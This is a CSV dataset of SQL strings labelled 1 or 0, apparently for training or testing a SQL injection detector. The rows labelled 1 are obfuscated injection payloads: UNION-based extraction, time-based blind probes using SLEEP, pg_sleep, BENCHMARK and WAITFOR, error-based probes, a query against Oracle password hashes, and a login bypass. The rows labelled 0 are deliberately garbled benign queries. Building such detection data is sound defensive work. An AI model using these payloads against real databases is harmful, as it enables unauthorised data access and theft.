Query,label
SELECT/**/K	$0x9FqNy*/*^*/FROMbuildWHERE fedNOT/*{2M5_*/=/**/'[happen]%',0
SELECT	AVG/*+ AND 0x1 OR 'f'!='f'#&*/(/*k|*/rain )/**/FROM found~H,0
"1""  )   Where (SELECT (SELECT 4180))  =  4180 oR Char  (  0x44  )   OR chAr  (  69  )   OR CHAr  (  97  )   OR cHAr  (  85  )    LIKE  ReGExP_SUBSTRIng  (  RePEAT  (  rIghT  (  CHAr  (  (SELECT (SELECT (SELECT (SELECT 5389))))  )  ,0  )  ,5000000000  )  ,nuLL  )  --",1
"/**/&& 1  LIKE  utl_inaddr.get_host_address   (    (  /*lU*/SELECT DISTINCT/*iL*/ (  PASSWORD/**//**/)  /*OU(*/FROM/**//*;*//**/(/**/ SELECT DISTINCT/**/ (/**//**/PASSW OR D  )  ,/*q*/ROWNUM AS/**/LIMIT FROM SYS.USER$  )   WHERE LIMIT  LIKE  (SELECT 6)/**/  ) /**//**/ )/**/ /**/  && /*(SELECT 4)*/'i'/**//**/=  'i",1
"1' or 0x20c0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0x1dcd6500/(SELECT (SELECT (SELECT (SELECT2))))   )    )      )    )    and 'bkcs'  =  'bkcs",1
SELECT/*>KB*/AVG ( growth/*FFMv+EA+I|/s(mH*/) FROM appleSELECTSUM ( rule )/*}gqE%*/,0
"1' oR EXtraCtVAluE  (  (SELECT 1297),cOncAt  (  0X5c,0X7171706a71,  (  sELECt   (  elT  (  (SELECT 1297)  =  1297,1   )    )     )  ,0x717a767a71   )    )    And 'UsNH' lIKe 'uSnH",1
"select LiKe  (  'abcDEFg',upPeR/**//*f_*/(  HEx/*&T*//**/( /*""e*/RanDoMblOb  ( /**/(SELECT 500000000)/(SELECT 2)   )    )    /*Yu*/ )    )    AnD ""%""  LIKE  """,1
"/**/SELECT column_name ( s/*j|j=5X`(SELECT 1)*/) /**/FROM no,former",0
"-5131' /*j??Lp&-*/ ) /*
Ipa~*/  )/**/ /*;d	I_*/ /*3$*/) /*Clt'A;*//**/unionall/**/select 4854,4854,4854,4854,(SELECT 4854),4854,4854/*!tp9d*/ OR /**/(SELECT 0)/**/  AND  /*(SELECT (SELECT (SELECT (SELECT 8))))QB*/""("" NOT LIKE ""(9""/**/OR/**/""e""<>""e""/*7*/OR/*9oK*/False/*!
AL*/ AND/**/ ""I} "" NOT/**/LIKE ""I}/**/<"" OR/*Ms&k*/""]"" NOT LIKE ""]"" OR ""8""<>""8"" AND ""<"" LIKE ""<"" AND True AND ""[r""!=""[r@"" OR ""I33"" NOT LIKE ""I33"" OR 0#.MaR~+NZ/**/+,",1
"1""/*?;qA"";*/and/*.aAp~k8<Ka
/**/+F*/7533/*6*//*8ppOVkA+Wr+b+""*/LIKE/**//*?YTr< && True  &&  True/**/AND True AND True#_T*/7533$(SELECT 4)^""",1
"mari/*"")Mn*/cielo",0
"1 /*y:iPS}a""TV{bL;]j(Tej*/)  /*>*/as/*9IO7g*/nmlm where/**/9872 /*rP6*/LIKE  9872",1
" /**/SELECT * FROM won WHERE/*N)l0z*/luckyIN  ( 'follow', 'gray', 'air' )/**/ ",0
" select * from/*~wSK*/users where id  LIKE/**//**/1 +\+./**/union/**/selectnull,@@VERSION --/*h/**/??!`6Tbi}S*/1",1
"/**//**/ SELECT/*v*/thick, doctor+ ', ' + creature+ ' ' + these+ ', ' + balance AS list  FROM wool",0
SELECT/**/AVG ( raw/**/) FROM to SELECT SUM ( small/*l9-)Z || 0 AND '0o'='0o'#*/)/**/,0
"calle/*(SELECT0x2)r4r.*/pea
defrancia,/*HuTBa*/(SELECT 0x3a),",0
"1%""/**//**/ )/*TvRn *//**//*cTz_*//**/)/**//*b/ OR/*Ev*/""3/"" NOT LIKE ""3/""/**/OR ""A"" NOT LIKE ""A""#?(SELECT/**/9)*//*8KN54*/	/**/)/*@Pp_d/Z*//**/ unionall/*?d*/selectnull,null,null,null,null,null,null,null,null,null--.RU?7R)",1
SELECT TOP/*^0x1~dk*/0x3 * FROM/**/hello,0
"calle/*1 OR ""vxLF"" LIKE ""vxLFA""#Y*/ponte vellas/n,/**/13ed",0
"SELECT/**/{rNv[*/**/FROM/**/goes FETCH FIRST 0x3
ROWS/* OR False#&*/ONLY",0
c//*j*/juan/*|:'-d*/perez arriete/**/1913e,0
1' where0xbd4  LIKE  3028,1
"/*"",l$;4/*/ SELECT mistake,fish,closeFROM plates LEFT JOIN Orders ONmeet.forgottenID =  worried.attention  || DER BY/*|\g1i!- OR 2904 NOT IN (2903,2904,2905)##eZ/*/angle.rocket.N",0
SELECT/*eXX*/announced ( s )/*-*//**/FROM/*ue0t`IUohXgogt20m*/terribleLEFTJOIN,0
-(SELECT 1344)  )   as gqGiWhEre 2545  =  2545 Or 4144  =    (  SeLECT uPpER  (  XmltYPE  (  CHR  (  60  )  ||cHr  (  58  )  ||chr  (  113  )  ||Chr  (  113  )  ||cHR  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SeleCT   (  Case wHen   (  4144  =  4144  )   THEn 1 eLsE 0 enD  )   fROM dual  )  ||cHR  (  113  )  ||ChR  (  122  )  ||CHR  (  118  )  ||cHr  (  122  )  ||cHr  (  113  )  ||ChR  (  62   )    )     )   fRoM duAL  )  --,1
SELECT/*Yzf*/COUNT ( equal/*E;~s8N`3C?0x2]0h*/)/*@evvk	*/FROM suppose,0
"1"" /*.?+m*/) /*<Ea/?It""*//*b/~7*/WHERe	0x2004 /*w+vePEl*/LIKE/*6GKX+;3T~*/ 8196",1
SELECT/**/*/**/FROM man/**//* AND 1 AND True AND True OR False AND True#*/WHEREhave LIKEcloselyhT6|B1,0
SELECT/*E OR 4200 LIKE 4201 AND True#)*/COUNT (/**/dawn )/**//**/FROMdiscuss,0
SELECT/**/B}g WA*/**/FROMneighborhood WHEREteeth/**/IN/*sA>--*/ ( SELECT island FROM warm/*(*/) ,0
"SELECTTOP/*7mZ)K%(SELECT 0x3)*/(SELECT (SELECT (SELECT (SELECT (SELECT
0x3)))))/**/* FROM lift WHERE man LIKE 'pleasure' SELECT/*QfQ 0x8*/#-
* FROM even",0
1'   )    )    rlIke   (  SEleCT   (  cAsEwHeN   (  0x1e09  =  (SELECT 0x1e09)  )   THen (SELECT 0x1) ELse 0x28eND   )    )    AND    (    (   'CzQK' = 'CZqk,1
"SELECT * FROM however/**/FETCH FIRST 0x32/*B6S
d
p)u5JC*/PERCENT ROWS ONLYSELECTTOP 0x3 * FROMbread",0
"-(SELECT 2417)/*SU)?/Yz]Th/**/j*//*e|z;rO*/)/**//**/ unionall/**/select (SELECT 2169),2169,2169,2169,0x879,0x879,2169,2169,2169,2169 AND817  NOT LIKE  818 AND ""o"" <> ""o:""/*BeTYm*/AND/**/""4""/**/LIKE ""4""  && /**/""^;""/*P*/LIKE ""^;"" AND True || (SELECT 1787) <> 1787 AND/*M*/True/**/AND/**/""!FH""/**/LIKE/**/""!FH"" AND/**/True  && /*3;UP */""i@""<>""i@z"" OR ""P""<>""P"" AND ""Mc`w"" NOT LIKE ""Mc`w-""#aa:""!h*",1
"1 /**//*!V6""K*/)    )     )   and 0x1ffd /**/LIKE    ( /**/select count  ( /**/*  )   from/**/sysibm.systables/*Q*/as t1,sysibm.systables as
t2,sysibm.systables/*/  &&  True && '_	' NOT LIKE '_	+' OR FalseOR "";""<>"";"" || ""kP,"" NOT LIKE ""kP,""  && /**/""4"" NOT LIKE ""4(""  &&  ""p:""<>""p:P""  &&  """""" NOT LIKE """"D"" OR 1732=(SELECT 1733)#E$*/as/**/t3/**//*RC!*/)/*c:[:*/ --.mC;<6ZG*we^['",1
"-0x24a3  )   ||MAkE_SeT  (  9354  =  9354,7185  )   AnD   (  9212  =  9212",1
SELECT */**/FROM/**/place WHEREoughtNOTBETWEEN 'belt'/*pnY]-*/&&/*-*i*/'noon',0
"SELECT/**/* FROM/*|D;0x1%=r*/fifteenWHEREstopped/*]t!];(0x1~Hz*/= 'rising' LIMIT3",0
SELECT/*tc]q))*/*/**/FROM master /**/WHEREspace/**/=/*gy(w]sxZM'1}*/graph,0
"-2430'  )  unionall select 5712,5712,5712,5712,5712,5712,5712,5712,(SELECT5712),5712--",1
-5067'   )    )    oR (SELECT 5903)  =    (  'qQpjq'||  (  SeLECt caSE 5903when 5903 THEN (SELECT 1) Else (SELECT (SELECT (SELECT (SELECT 0)))) end FROm rdB$DaTabaSe  )   || 'QzVzQ'  )   aND    (    (   'vKab' = 'vKaB,1
-5995'   )    )    or (SELECT6872)  =  6872and    (    (   'pywh'  LIKE  'pywh,1
"1'+/**//*""_rs*/( /**/select/**/dpkp where/**/4836/**//*uar?'m*/= /**/0x12e4/**/andsleep/**//*pAn{*/( /***/(SELECT (SELECT/**/(SELECT 5)))/**//**//**/)/*(SELECT (SELECT (SELECT (SELECT/*/?8*/9))))=*//*;*/ /**/)/*d/*<n*/W<EQaht?*//**//**/+'",1
"SELECTAVG/*-(SELECT 0x0)|*/(/**/late )/*Z*/FROM/*jdc*/vote",0
aDMIn' --,1
"1/**//**//*D*/)/**/   )    as rcon/*a.o*/where/**/0x1ffe  LIKE  0x1ffe/**/or/**/(SELECT/*ur*/(SELECT (SELECT 0x14a6))) /**/=/**//**//**/ ( /**/select count  (  */**/ )  /**/from/*""!sE8e*/all_users t1,all_users/**/t2,all_users/*z[o^iy*/t3,all_userst4,all_users/*!SFL}*/t5/*R?wh*/ )/*zE*//*0x7~*/--",1
"SELECT MIN/*G/*/( avoid )  AS above/*-@&""Yq%q0xNTI(=,FvBc7*/FROM joined",0
"1,  (  sELEcT   (  caSe wHen   (  7711  =  7711  )   tHeN1 ElsE 7711*  (  sELeCT 7711 FroMiNFormatioN_SCHEMA.ChARaCTer_SETs  )   end   )    )   ",1
SELECT/**/TOP 0x3 * FROM songWHERE shout/*p% AND True AND/**/(SELECT 1)#/<*/= 'young'({,0
"/*u@ip*/ SELECT LOCATE (/*%[bx*/""com"", ""W3Schools.com"", 0x3 )  AS MatchPosition;",0
1  )   ascinw where 0xe94  =  0xe94and 8594  =    (  select 8594frompg_sleep  (  (SELECT 0x5)   )    )   --,1
SELECTCOUNT/*|{*/(/**/author ) FROM/*|F AND (SELECT 776) NOT LIKE 777 AND 7013!=7014#]p-'*/bear,0
DELETE/*ZoOMcX	xcZ*/FROM/*N--(SELECT 0x8)mu8*/seems/**/WHERE/**/cream LIKE/**/'production',0
sELECT PG_slEEP  (  5  )   aND    (    (     (  'QsLr'  LIKE  'qsLr,1
narros/*e/*|)qKVLr AND 753!=754#nBJ*/;*/dematalayeguaqs,0
"1'||  (  SeleCt 'zvPL' WHERE 5877  =  5877 UnION AlL SEleCT NulL,NullAND 4633 IN (4632,4633,4634) AND ""B2D;W""=""B2D;W"" OR 8261 = 8262 AND 8962 = 8962 AND 5370 IN (5369,5370,5371) OR 3889 NOT IN (3888,3889,3890) OR 0x1e5f=7776 OR 7990 NOT IN (7989,7990,7991) AND 4513 NOT = 4514 OR 9582=9583AND 3999 IN ((SELECT 3998),3999,4000) || 8888!=8888 AND 3559 IN (3558,3559,3560) AND 3457 IN (3456,3457,3458) AND 2182 IN (2181,2182,2183) AND 4382!=4383 AND 9772 LIKE 9772 OR 1007<>1007#4KvY-8GKb5ozC2wmxg82c",1
"SELECT MIN/**/( bound/* OR 7325 NOT IN (7324,7325,7326) OR False#fq*/) /**/AS slopeFROM dated\u",0
"-3688'|| /**/(  select 'pber'/**/from dual where (SELECT 7137)/**/ LIKE/**//**/7137order/*Yi~*/by/**/(SELECT (SELECT 1))/*6P*//*?*/&&/**/ ""?ue"" NOT LIKE ""?ueG"" /**/&&  True/**//*;[>(SELECT 0)ineUuP*/ AND   True AND ""<"" LIKE ""<""  &&  True AND/**/(SELECT 1831)/**/LIKE 1831/*r*/AND/**/True/**/ &&  True AND/**/""<"" NOT/*e/**/W%t*/LIKE/**/""<C"" && True OR 'No\'<>'No\' OR ""N?"" LIKE ""N?i"" OR ""8""<>""8""#`~*oP",1
"/**/  SELECT unless,/**/applied, expressFROM/*fV['*/know WHERE/*Z:r*/slow  IS NOT NULL",0
1  )   and0xe4b  LIKE  5475and   (  8949  LIKE  8949,1
SELECT/**/*/*.#*/FROMcontrol,0
"SELECT/*),*/ AND ""A""=""A""#$F/*/**/FROM purpose3@?",0
"1   )    )    aS llnm WHeRe6510  =  6510 aND 3202  =  LIkE  (  'abCDEFg',UpPER  (  hex  (  RANdombLOb  (  500000000/2   )    )      )    )   --",1
1 where5700  LIKE  5700,1
"SELECT/**/* FROM/**/straight/**//*TB OR 1595 NOT IN (1594,1595,1596)#i*/WHEREtherefore
= directionX",0
"c//**/airade/**/villaescusa/**/(SELECT 199),/**/1f",0
waitfor/**/delay/**/'0:(SELECT (SELECT (SELECT (SELECT 0)))):5'/**/and/**/'%'/**//*bjpa:^BY:_t*/LIKE  ',1
SELECT /;*/*Xpjb7dTc*/FROM/**/hurtWHEREmorning/*e0EL7@*/= 'summer',0
"SELECT/*)U*/post_id, meta_key, meta_value/*.GN)*/FROM
wp_postmeta WHEREpost_id IN  ( 367678,299806,299807,367679,299808,80777,30322,80782,28561,262315,299804,30387,228217,0x59c40,367681,367682,0x59c43,367684,(SELECT 367685),367686,30220,262317,30380,80779,30384,30390,80780,290065,0x47100,320706 ) /**/ || DER BYmeta_idASC",0
"SEleCtBenchmaRK  (  5000000,Md5  (  0x4C4d6142   )    )    AND 'Fgcg'  =  'FGCG",1
"SELECT/**/* FROM/*(SELECT (SELECT 1)):%&i*/lion FETCH
FIRST 0x3/*@5*/ROWS ONLY",0
"1""   )    )     )   and elt  (  1750  LIKE  7826,7826  )   and    (    (     (  ""qcro""/*KCr.&8K
vEEN	*//*?On`B*B*/LIKE/*(SELECT 9)/y$A??Trs*//**/""qcro",1
SELECT * FROM door WHERE/**/one BETWEEN '1996-(SELECT 07)-01'/*\yRT`-*/ &&  '1996-07-31',0
SELECT/**/*/*%0-9 AND 'Eh-J'='Eh-J'#*/FROM distant WHERE silent NOT LIKE 'many%',0
1%'   )    )    And (SELECT 8594)  =    (  seLEcT 8594 frOMpG_sLeeP  (  0x5   )    )   --,1
"DELETEFROMcompare WHEREsurprise =/*JX|/**/AND ""$7""<>""$7i"" OR 3050 NOT IN (3049,3050,3051)#vFH3*/'enemy'",0
"1 /**/) /**/ and/*[?)*/elt  (  (SELECT 3114) /*.L*/LIKE  0xc2a,sleep/**/ (  5 /**/ )  /**/ )    OR/**/""q""/**/NOT LIKE/**/""q"" AND ""4JhA""<>""4JhA|"" AND True OR "" OR 0#"" LIKE ""#4""#_~Ay:.ayYj",1
SELECT * FROM secondWHEREstar = 'island'/**/ ||/*|Aads	*/river LIKE 'beside',0
"SELECTcomeFROM realize UNION SELECTinstrument
FROMfly  ||/*.ke?aWe#oE*/DER BY/*[*AEG`?*$u*/sellaw0",0
"/**//*$T(I8*/ SELECT flow, stop+ ', '/**/+ oxygen+ ' ' + temperature+ ', ' + trunk AS rise  FROMgulf",0
"  SELECT QUARTER (/*r$R9dnL7S(pDY, cp|*/""2017-0x6-15"" )/*x
).t#*/;",0
"SELECT invented/**/(/*@u{
0x3:ixl*/s )  FROM rays UNION",0
"-5852  )   aS ANCa WheRe (SELECT 3574)  LIKE  3574oR 3958  LIKE/*i_My*//**GOHUcbY;7*/5536AND ""py""  NOT LIKE  ""pyV""#BRaGtezNYPoA	",1
"1%""   )    )    pRoceDUReANALySe  (  ExTrACtvaLue  (  9255,conCat  (  0X5C,  (  bENChMARk  (  0x4c4b40,mD5  (  0X52515a50   )    )      )    )     )  ,1  )   aND    (    (   ""%""  =  """,1
"select * from generate_series  (  7762,7762,case when   (  7762  =  1293  )   then 0x1 else (SELECT (SELECT (SELECT (SELECT (SELECT (SELECT (SELECT 0))))))) end  )   limit1--",1
"SELECT * FROM tone WHERE swimming/**/= 'rapidly'/* OR 0 OR 'x'='x&'#Tj)=*/  &&  City = 'huge'-(""",0
"1%'   )    )    or 7427  =  Dbms_PIPe.ReCeiVE_MEssaGE  (  cHR  (  116  )  ||chr  (  87  )  ||cHr  (  90  )  ||CHR  (  109  )  ,(SELECT5)  )  --",1
"1' Or9643  =    (  SelEcT cOUNt  (  *  )   fROMDoMAin.doMaiNs as t1,domAiN.ColUmnS AS T2,DOMAiN.TABLES AS t3  )  ",1
"SELECT * FROM label WHERE against/**/= 'trade'/**/ &&/*_--*/ ( heard LIKE 'biggest' || flow/**/LIKE/*b~ZOR 0x0 || 1947=1948#+*/'simple'/*M;'DzI""g*/)/**/)'K(s",0
"febrer/*-*.T>CM'-]""LY^F!w0x4?Xf?`@itYx*/pedrouzo",0
" select * fromusers where/**/id  =  1 or 1 AND """"="""" OR ""Ti'"" LIKE ""Ti'i"" AND ""	yN""!=""	yNM""#"".  LIKE  1/*`*/union select 0x1,version  (   /*T~,*/)  /*CG?L*/-- 14Ub",1
SELECT/*E6})}0x56`*/*/**/FROMdrop WHERE    NOT offer/*:X|*/= 'conversation',0
"pl./**/currocuchares,/**/72,",0
"/**/ SELECT/**/islandID/**/AS/**/ID, skin AS because FROM/**/thousand",0
sEleCt   (  CASe wHeN   (  8362  =  7572  )   TheN8362 elsE CasT  (  1 As iNT  )  /  (  select0 fROm Dual  )   eNd  )   from dUAL--,1
"1'+/**//*|8.3o.gUBEa*/(/*:*/ select/*(SELECT 0x4)|h[_lY;IZ	M*/qdon/**/where/*!_!\WaH*/0x24ed/*,m4Ew!wm*//*b*/LIKE/*L	KCG:@[a*//*ci+*/9453",1
"1%'/*""w*//*;;`,sF*/)/*hD*//*A.Q/d*//*:EM*/and/*?`\,\!*/(SELECT/**/(SELECT 2006))/*9;*/ LIKE/*oY~!Z{\(SELECT/**/(SELECT (SELECT (SELECT/**/8)))):*/ 2006",1
"1%'/*w*//*H*/ ) /**/  )   /**//*T'a/<*/)  /**/and (SELECT (SELECT 6537))/*]`:9OAeJ*aW*/ LIKE  dbms_pipe.receive_message  (  chr/*d$*/ (  76  )   OR chr  (  (SELECT 116)  )  ||chr  ( /**/117  ) /*qP.D+*/||chr  (/*Xu)"".OZ*/ 65 /*f_~.*/)  ,(SELECT (SELECT 5))/*]5P>rime*//*wni*/) /*<K*/ and  /**/ (/**//**/  (  /**/ /*=;8*/(  '%'  LIKE /*Ec*/'",1
